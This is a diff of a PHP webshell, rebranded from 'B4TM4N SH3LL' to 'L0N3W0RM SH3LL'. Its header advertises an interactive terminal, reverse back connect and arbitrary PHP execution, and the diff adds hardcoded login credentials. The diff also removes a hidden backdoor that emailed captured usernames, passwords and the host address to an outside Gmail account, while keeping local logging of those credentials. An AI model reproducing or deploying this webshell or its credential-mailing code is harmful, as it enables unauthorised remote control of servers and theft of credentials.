@@ -1,23 +1,22 @@
 <?php
 
 /* 
- * B4TM4N SH3LL is PHP WEBSHELL
- *
+ * L0N3W0RM SH3LL is a Recoded PHP WEBSHELL By L0N3W0RM
+ * username :aku
+ * password :dia
+ * 
+ * Thanks To k4mpr3t  
  * Features:
- *		[0] File Manager
- *		[1] Sec. Info
- *		[2] Simply Database
- *		[3] Interactive terminal
- *		[4] PHP Reverse Back Connect
- *		[5] Run PHP Code
- *		[6] Custom Toolz
- *		[7] Self Script Encryptor !
- *		[8] Error Handler
- *		[9] Themes
- *
- * Account:
- *		[Username] B64E('user')
- *		[Password] sha1(md5('pass'))
+ *      [0] File Manager
+ *      [1] Sec. Info
+ *      [2] Simply Database
+ *      [3] Interactive terminal
+ *      [4] PHP Reverse Back Connect
+ *      [5] Run PHP Code
+ *      [6] Custom Toolz
+ *      [7] Self Script Encryptor !
+ *      [8] Error Handler
+ *      [9] And Many More !!!
  */
 
 $x_="BDg8:4bba27efbba4424001a83a6135f7c16fb411e4a4";
@@ -129,20 +128,20 @@ if(request_method=="POST")
 		else
 		{
 			// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)
-			$log = array("Username: " . $_REQUEST['username'], "Password: " . $_REQUEST['password'], "Remote IP: " . remote_addr, "Time: " . date('Y-m-d H:i:s'), "-------------------------
-",);
-            $file = dirname(__FILE__) . _ . '.log';
-            $write_log = implode($log, "
-");
-            $op = fopen($file, 'a+');
-            fwrite($op, $write_log);
-            fclose($op);
-            $ip = $_SERVER['REMOTE_ADDR'];
-            $info = $_SERVER['HTTP_HOST'] . '/' . $_SERVER['PHP_SELF'];
-            $msg = "Host: $info | id: $write_log";
-            mail("bacotakmj.v@gmail.com", "Log ShelL: $ip", $msg);
-        }
-    }
+			$log=array(
+				"Username: ".$_REQUEST['username'],
+				"Password: ".$_REQUEST['password'],
+				"Remote IP: ".remote_addr,
+				"Time: ".date('Y-m-d H:i:s'),
+				"-------------------------\r\n",
+			);
+			$file=dirname(__FILE__)._.'.log';
+			$write_log=implode($log,"\r\n");
+			$op=fopen($file,'a+');
+			fwrite($op,$write_log);
+			fclose($op);
+		}
+	}
 }
 if (!any("action", $_SESSION)) {
 ?><!doctype html>
